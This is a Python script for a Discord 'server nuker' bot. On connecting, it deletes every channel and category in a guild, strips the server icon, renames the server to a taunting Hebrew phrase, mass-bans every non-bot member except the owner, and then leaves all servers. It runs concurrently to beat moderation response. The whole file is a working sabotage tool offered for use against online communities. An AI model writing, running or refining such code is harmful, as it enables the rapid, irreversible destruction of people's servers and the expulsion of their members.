import discord
import asyncio
import time
import os
from colorama import Fore, init

init(autoreset=True)

# Maximum concurrency for ultra-fast deletion
MAX_CONCURRENT_OPERATIONS = 100

intents = discord.Intents.all()
client = discord.Client(intents=intents)

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_title():
    from colorama import Style
    
    lines = [
        " ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  ",
        " ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒",
        "▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒",
        "▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  ",
        "▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒",
        "░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░",
        "░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░",
        "   ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ ",
        "         ░    ░     ░  ░      ░  ░   ░     ",
        "                                            "
    ]
    
    for line in lines:
        print(Fore.BLUE + line)
    
    print()
    print(Fore.CYAN + "Ultra-High-Speed Complete Server Nuker - Made By Undetected.\n")

# Global counters for real-time tracking
deleted_count = 0
total_channels = 0
start_time = 0

async def delete_channel_with_semaphore(semaphore, channel):
    """Delete a single channel with semaphore control for rate limiting"""
    global deleted_count
    
    async with semaphore:
        try:
            await channel.delete()
            deleted_count += 1
            # Only print every 10th deletion to avoid slowing down with excessive prints
            if deleted_count % 10 == 0:
                elapsed = time.time() - start_time
                rate = deleted_count / elapsed if elapsed > 0 else 0
                print(f"{Fore.GREEN}[{deleted_count}/{total_channels}] Rate: {rate:.1f}/sec")
        except Exception as e:
            # Minimal error handling to maintain speed
            pass

async def delete_item_with_semaphore(semaphore, item, item_type):
    """Delete a single item with semaphore control for rate limiting"""
    global deleted_count
    
    async with semaphore:
        try:
            if item_type == "channel":
                await item.delete()
            deleted_count += 1
        except Exception as e:
            # Minimal error handling to maintain speed
            pass

async def ban_member_with_semaphore(semaphore, guild, member):
    """Ban a single member with semaphore control for rate limiting"""
    global deleted_count
    
    async with semaphore:
        try:
            await guild.ban(member, reason="Server nuked")
            deleted_count += 1
        except Exception as e:
            # Minimal error handling to maintain speed
            pass

async def delete_all_channels(guild, semaphore):
    """Delete all text/voice channels first"""
    channels = [ch for ch in guild.channels if ch.type != discord.ChannelType.category]
    if not channels:
        print(f"{Fore.YELLOW}No channels to delete")
        return 0
    
    print(f"{Fore.CYAN}Deleting {len(channels)} channels...")
    tasks = [delete_item_with_semaphore(semaphore, channel, "channel") for channel in channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"{Fore.GREEN}✓ All channels deleted")
    return len(channels)

async def delete_all_categories(guild, semaphore):
    """Delete all categories after channels"""
    categories = [ch for ch in guild.channels if ch.type == discord.ChannelType.category]
    if not categories:
        print(f"{Fore.YELLOW}No categories to delete")
        return 0
    
    print(f"{Fore.CYAN}Deleting {len(categories)} categories...")
    tasks = [delete_item_with_semaphore(semaphore, category, "channel") for category in categories]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"{Fore.GREEN}✓ All categories deleted")
    return len(categories)

async def change_server_settings(guild):
    """Change server name and remove icon"""
    operations = 0
    try:
        await guild.edit(icon=None)
        print(f"{Fore.GREEN}✓ Server icon removed")
        operations += 1
    except Exception as e:
        print(f"{Fore.RED}Failed to remove icon: {str(e)}")
    
    try:
        await guild.edit(name="זה מה שקורה שמתעסקים עם כוכבי")
        print(f"{Fore.GREEN}✓ Server name changed to: NAME")
        operations += 1
    except Exception as e:
        print(f"{Fore.RED}Failed to change name: {str(e)}")
    
    return operations

async def ban_all_members(guild, semaphore):
    """Ban all members with maximum concurrency"""
    members = [member for member in guild.members if not member.bot and member != guild.owner]
    if not members:
        print(f"{Fore.YELLOW}No members to ban")
        return 0
    
    print(f"{Fore.CYAN}Banning {len(members)} members...")
    tasks = [ban_member_with_semaphore(semaphore, guild, member) for member in members]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"{Fore.GREEN}✓ All members banned")
    return len(members)

async def ultra_speed_complete_nuke(guild):
    """Complete server wipe in sequential order (without role deletion)"""
    global deleted_count, total_channels, start_time
    
    print(f"{Fore.CYAN}Starting complete server wipe...")
    print(f"{Fore.CYAN}Order: Channels → Categories → Server Settings → Ban Members\n")
    
    # Record precise start time
    start_time = time.time()
    
    # Create semaphore for maximum concurrency
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OPERATIONS)
    
    total_operations = 0
    deleted_count = 0
    
    # Step 1: Delete all channels first
    print(f"{Fore.YELLOW}━━━ STEP 1: DELETING CHANNELS ━━━")
    channels_deleted = await delete_all_channels(guild, semaphore)
    total_operations += channels_deleted
    deleted_count += channels_deleted
    
    # Step 2: Delete all categories
    print(f"\n{Fore.YELLOW}━━━ STEP 2: DELETING CATEGORIES ━━━")
    categories_deleted = await delete_all_categories(guild, semaphore)
    total_operations += categories_deleted
    deleted_count += categories_deleted
    
    # Step 3: Change server settings
    print(f"\n{Fore.YELLOW}━━━ STEP 3: CHANGING SERVER SETTINGS ━━━")
    settings_changed = await change_server_settings(guild)
    total_operations += settings_changed
    
    # Step 4: Ban all members
    print(f"\n{Fore.YELLOW}━━━ STEP 4: BANNING MEMBERS ━━━")
    members_banned = await ban_all_members(guild, semaphore)
    total_operations += members_banned
    
    # Calculate final performance metrics
    end_time = time.time()
    total_time = end_time - start_time
    average_rate = total_operations / total_time if total_time > 0 else 0
    
    print(f"\n{Fore.GREEN}━━━ COMPLETE SERVER WIPE FINISHED ━━━")
    print(f"{Fore.GREEN}✓ Channels deleted: {channels_deleted}")
    print(f"{Fore.GREEN}✓ Categories deleted: {categories_deleted}")
    print(f"{Fore.GREEN}✓ Members banned: {members_banned}")
    print(f"{Fore.GREEN}✓ Total operations: {total_operations}")
    print(f"{Fore.GREEN}✓ Total time: {total_time:.3f} seconds")
    print(f"{Fore.GREEN}✓ Average rate: {average_rate:.1f} operations/second")
    
    print(f"\n{Fore.GREEN}✓ SERVER COMPLETELY WIPED!")
    if total_time <= 2.0:
        print(f"{Fore.GREEN}✓ Completed in under 2 seconds - Ultra fast!")
    else:
        print(f"{Fore.GREEN}✓ Took {total_time:.3f} seconds - All operations finished")
    
    # Return results for final stats
    return channels_deleted, categories_deleted, members_banned

@client.event
async def on_ready():
    clear_terminal()
    show_title()
    
    print(f"{Fore.GREEN}[+] Bot connected successfully!")
    print(f"{Fore.GREEN}[+] Connected to: {client.guilds[0].name}")
    print(f"{Fore.GREEN}[+] Max concurrent operations: {MAX_CONCURRENT_OPERATIONS}")
    
    guild = client.guilds[0]
    
    # Start complete ultra-speed server nuke immediately
    nuke_results = await ultra_speed_complete_nuke(guild)
    channels_deleted, categories_deleted, members_banned = nuke_results
    
    print(f"\n{Fore.CYAN}[✓] Ultra-speed nuke complete. Leaving all servers...")
    
    # Leave all servers after completion
    servers_left = 0
    for g in client.guilds:
        try:
            await g.leave()
            servers_left += 1
            print(f"{Fore.GREEN}[✓] Left server: {g.name}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to leave: {g.name}")
    
    print(f"\n{Fore.GREEN}━━━ NUKE SUCCESSFUL ━━━")
    print(f"{Fore.GREEN}Channels deleted: {channels_deleted}")
    print(f"{Fore.GREEN}Categories deleted: {categories_deleted}")
    print(f"{Fore.GREEN}Members banned: {members_banned}")
    print(f"{Fore.GREEN}Servers left: {servers_left}")
    print(f"{Fore.GREEN}━━━ ALL OPERATIONS COMPLETE ━━━")
    
    # Close the bot connection
    await client.close()

async def run_ultra_speed_bot():
    """Main execution function with optimized connection"""
    clear_terminal()
    show_title()
    
    # Get token from environment or user input
    token = os.getenv("DISCORD_BOT_TOKEN")
    if not token:
        token = input(f"{Fore.WHITE}Enter your bot token: ").strip()
    
    if not token:
        print(f"{Fore.RED}[-] No token provided.")
        return
    
    try:
        print(f"{Fore.CYAN}[+] Connecting with ultra-speed configuration...")
        await client.start(token)
    except discord.LoginFailure:
        print(f"{Fore.RED}[-] Invalid token.")
    except Exception as e:
        print(f"{Fore.RED}[-] Connection error: {str(e)}")

# Start the ultra-speed bot
if __name__ == "__main__":
    asyncio.run(run_ultra_speed_bot())